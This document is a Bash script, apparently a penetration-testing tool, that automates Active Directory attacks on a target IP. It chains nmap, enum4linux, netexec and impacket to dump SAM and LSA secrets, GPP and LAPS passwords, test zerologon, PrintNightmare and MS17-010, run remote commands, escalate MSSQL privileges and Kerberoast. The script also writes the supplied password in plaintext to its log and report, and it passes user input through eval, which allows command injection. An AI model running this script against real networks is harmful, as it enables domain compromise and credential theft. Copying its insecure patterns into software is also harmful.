#!/usr/bin/env bash

# ========================================================================================
# ADScanner.sh - Active Directory Enumeration Script
# GNU Bash 5.2.37(1)-release compatible
# Author: ElusiveHacker
# ========================================================================================

# ------------------------------------
# Version Check
# ------------------------------------
REQUIRED_VERSION="5.2.37"
if ! [[ "$BASH_VERSION" =~ ^${REQUIRED_VERSION} ]]; then
    echo "[!] Bash version $REQUIRED_VERSION is required. Current version: $BASH_VERSION"
    exit 1
fi

# ------------------------------------
# Global Variables and Defaults
# ------------------------------------
export SCRIPT_DIR="$(dirname "$0")"
export OUTPUT_DIR="$SCRIPT_DIR/tool_outputs"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$SCRIPT_DIR/ADScanner.log"
DATE_TIME="$(date +%Y%m%d_%H%M)"
REPORT_FILE="$SCRIPT_DIR/${DATE_TIME}_report.txt"

export IP=""
export USERNAME=""
export PASSWORD=""
export DOMAIN=""
export QUIET_MODE=false
export trueRoot=false
export OPEN_PORTS=""

# Load configuration if available
CONFIG_FILE="$SCRIPT_DIR/config.sh"
[[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE"

# Default ports (can be overridden by config.sh)
SMB_PORTS="137,138,139,445"
LDAP_PORTS="389,636"
MSSQL_PORT="1433"
WINRM_PORTS="5985,5986"
KERBEROS_PORT="88"
SSH_PORT="22"
MYSQL_PORT="3306"
HTTP_PORT="80"
HTTPS_PORT="443"
NFS_PORT="2049"
FTP_PORT="21"

# ------------------------------------
# Logging Functions
# ------------------------------------
log() {
    local type="$1"
    local msg="$2"
    local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
    echo "[$timestamp] [$type] $msg" | tee -a "$LOG_FILE" >> "$REPORT_FILE"
}

append_to_report() {
    local section="$1"
    local message="$2"
    echo -e "\n---------- $section ----------" >> "$REPORT_FILE"
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$REPORT_FILE"
}

# ------------------------------------
# Root Privilege Check
# ------------------------------------
check_root() {
    if [[ $(id -u) -ne 0 ]]; then
        log "ERROR" "Script must run as root. Use sudo."
        exit 1
    else
        export trueRoot=true
        $QUIET_MODE || echo "[+] SCRIPT IS RUNNING AS ROOT"
        log "INFO" "Script is running as root."
    fi
}

# ------------------------------------
# Argument Parsing
# ------------------------------------
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i)
                IP="$2"; shift 2;;
            -u)
                USERNAME="$2"; shift 2;;
            -p)
                PASSWORD="$2"; shift 2;;
            -d)
                DOMAIN="$2"; shift 2;;
            --quiet)
                QUIET_MODE=true; shift;;
            *)
                log "ERROR" "Unknown argument: $1"
                exit 1;;
        esac
    done

    # Validate IPv4 format
    if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        log "ERROR" "Invalid IPv4 format. Use xxx.xxx.xxx.xxx"
        exit 1
    fi

    export IP USERNAME PASSWORD DOMAIN
    log "INFO" "Inputs: IP=$IP USERNAME=$USERNAME PASSWORD=$PASSWORD DOMAIN=$DOMAIN"
}

# ------------------------------------
# Connectivity Check
# ------------------------------------
test_connectivity() {
    local host="$1"
    if ping -c 1 -W 2 "$host" > /dev/null 2>&1; then
        [[ "$QUIET_MODE" = false ]] && echo "[+] Host $host is reachable"
        append_to_report "Connectivity Check" "Host $host is reachable"
    else
        [[ "$QUIET_MODE" = false ]] && echo "[-] Host $host is not reachable"
        append_to_report "Connectivity Check" "Host $host is not reachable"
        log "ERROR" "Ping to $host failed"
        exit 1
    fi
}

# ------------------------------------
# Port Scanning
# ------------------------------------
scan_ports() {
    local ports="$SMB_PORTS,$LDAP_PORTS,$MSSQL_PORT,$WINRM_PORTS,$KERBEROS_PORT,$SSH_PORT,$MYSQL_PORT,$HTTP_PORT,$HTTPS_PORT,$NFS_PORT,$FTP_PORT,$SSH_PORT"
    log "INFO" "Scanning ports: $ports"
    nmap -n -p "$ports" "$IP" -oG "$OUTPUT_DIR/nmap.output" --open > "$OUTPUT_DIR/nmap_grepable_summary.output"
    local result=$(cat "$OUTPUT_DIR/nmap_grepable_summary.output")
    append_to_report "Port Scan" "$result"

    export OPEN_PORTS=$(grep -Po '\d+/open/tcp' "$OUTPUT_DIR/nmap.output" | cut -d '/' -f1 | paste -sd ',' -)
    log "INFO" "Open ports: $OPEN_PORTS"
    [[ -z "$OPEN_PORTS" ]] && log "WARNING" "No open ports detected. Nmap parsing may have failed."
}

# ------------------------------------
# Clock Synchronization
# ------------------------------------
sync_clock() {
    if [[ -n "$DOMAIN" ]]; then
        if command -v ntpdate > /dev/null; then
            ntpdate "$DOMAIN" && log "INFO" "Clock synchronized with $DOMAIN" || log "ERROR" "Failed to sync with $DOMAIN"
        elif command -v smbclient > /dev/null; then
            smbclient -L "$IP" -U "$USERNAME%$PASSWORD" -W "$DOMAIN" -m SMB3 || log "ERROR" "smbclient time query failed"
        else
            log "INFO" "Clock sync tools unavailable. Skipping clock sync."
        fi
    else
        log "INFO" "Domain not provided. Skipping clock synchronization."
    fi
}

# ------------------------------------
# Active Directory Enumeration
# ------------------------------------

# Netexec for SMB
execute_netexec_smb() {
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules (AD Vulnerability Assessment):
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=("--shares"
        	 "--users" 
        	 "--groups"
        	 "--pass-pol"
        	 "--local-group"
        	 "--rid-brute"
        	 "--delegate Administrator"
        	 "-M gpp_password" 
        	 "-M coerce_plus" 
        	 "-M enum_av" 
        	 "-M enum_ca" 
        	 "-M gpp_autologin" 
        	 "-M spooler" 
        	 "-M webdav"
        	 "-M veeam"
        	 "-M zerologon"
        	 "-M printnightmare"
        	 "-M ms17-010"
        	 "-M gpp_autologin"
        	 "--sam" #Dump SAM hashes. Requires Administrator privileges
        	 "--lsa" #Dump LSA secrets. Requires Domain Administrator or Local Administrator Priviledges
        	 "--user $USERNAME" #Dump the NTDS.dit from target DC. Requires Domain Administrator or Local Administrator Priviledges
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec smb $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_smb.output"
            append_to_report "netexec SMB $mod" "$OUT"
        done
    fi
}

# Netexec for LDAP
execute_netexec_ldap() { # LDAP Low Privilege Modules
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
        MODULES=("-M adcs" #Find PKI Enrollment Services in Active Directory and Certificate Templates Names
                 "-M enum_trusts" #Extract all Trust Relationships, Trusting Direction, and Trust Transitivity
                 "-M get-desc-users" #Get description of the users. May contained password
                 "-M get-network" #Query all DNS records with the corresponding IP from the domain.
                 "-M get-unixUserPassword" #Get unixUserPassword attribute from all users in ldap
                 "-M get-userPassword" #Get userPassword attribute from all users in ldap
                 "-M groupmembership -o USER=$USERNAME" #Query the groups to which a user belongs.
                 "-M laps" #Retrieves all LAPS passwords which the account has read permissions for.
                 "-M ldap-checker" #Checks whether LDAP signing and binding are required and / or enforced
                 "-M pso" #Query to get PSO from LDAP
                 "-M subnets" #Retrieves the different Sites and Subnets of an Active Directory
                 "-M user-desc" #Get user descriptions stored in Active Directory
                 "-M whoami" #Get details of provided user
                 "-M daclread -o TARGET=Administrator ACTION=read" # Get DACLs for priv escalation
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ldap $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ldap.output"
            append_to_report "netexec ldap $mod" "$OUT"
        done
    fi
}

# Netexec for WinRM, just check if credentials are valid fir WinRM
execute_netexec_winrm() {
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"5985"* || "$OPEN_PORTS" == *"5986"* ]]; then
        MODULES=(" " # No modules for WinRM exist at this time.
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec winrm $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_winrm.output"
            append_to_report "netexec winrm $mod" "$OUT"
        done
    fi
}

# Netexec for MSSQL
execute_netexec_mssql() {
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"1433"* ]]; then
        MODULES=(" "
        	 "--local-auth"
        	 "--local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'"
        	 "--local-auth -x whoami"
        	 " --rid-brute"
        	 "-M mssql_priv -o ACTION=privesc"
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec mssql $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_mssql.output"
            append_to_report "netexec mssql $mod" "$OUT"
        done
    fi
}

# Netexec for SSH
execute_netexec_ssh() { 
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"22"* ]]; then
        MODULES=(" "
        	 "--local-auth"
        	 "-x whoami"
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ssh $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ssh.output"
            append_to_report "netexec ssh $mod" "$OUT"
        done
    fi
}

# Netexec for ftp
execute_netexec_ftp() { 
    if ! command -v netexec > /dev/null; then
        log "ERROR" "netexec is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"21"* ]]; then
        MODULES=(" "
        	 "--local-auth"
        	 "--ls"
        	 )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ftp $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ftp.output"
            append_to_report "netexec ftp $mod" "$OUT"
        done
    fi
}

# Active Directory enumeration using enum4linux
execute_enum4linux() {
    if ! command -v enum4linux > /dev/null; then
        log "ERROR" "enum4linux is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=("-a") # Add options to be executed.
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux.output"
            append_to_report "enum4linux $mod" "$OUT"
        done
    fi
}

# Active Directory enumeration using enum4linux-ng
execute_enum4linux-ng() { 
    if ! command -v enum4linux-ng > /dev/null; then
        log "ERROR" "enum4linux-ng is not installed"
        return
    fi
    #Execution of netexec with modules:
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(" ") # Add options to be executed.
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux-ng $IP"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u $USERNAME -p $PASSWORD"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval $CMD 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux-ng.output"
            append_to_report "enum4linux-ng $mod" "$OUT"
        done
    fi
}

# Test AD for Kerberoasting
execute_impacket_getuserspns() {
    if ! command -v impacket-GetUserSPNs > /dev/null; then
        log "ERROR" "impacket-GetUserSPNs is not installed"
        return
    fi
    # Execution of impacket-GetUserSPNs:
    if [[ "$OPEN_PORTS" == *"445"* || "$OPEN_PORTS" == *"88"* ]]; then
        CMD="impacket-GetUserSPNs $DOMAIN/"$USERNAME":"$PASSWORD" -dc-ip $IP -request"
        log "INFO" "Executing: $CMD"
        OUT=$(eval $CMD 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/impacket_getuserspns.output"
        append_to_report "impacket-GetUserSPNs" "$OUT"
    fi
}

# ------------------------------------
# Main Execution
# ------------------------------------
main() {
    check_root # Check if script is running as root
    parse_args "$@"
    test_connectivity "$IP" # Check if target is running and is accessible 
    scan_ports # Get open ports
    sync_clock # Sync clock for kerberoasting attacks

    # AD Enumeration
    execute_enum4linux
    execute_enum4linux-ng
    execute_netexec_smb
    execute_netexec_winrm
    execute_netexec_ldap
    execute_netexec_mssql
    execute_netexec_ssh
    execute_netexec_ftp
    execute_impacket_getuserspns
}

main "$@"
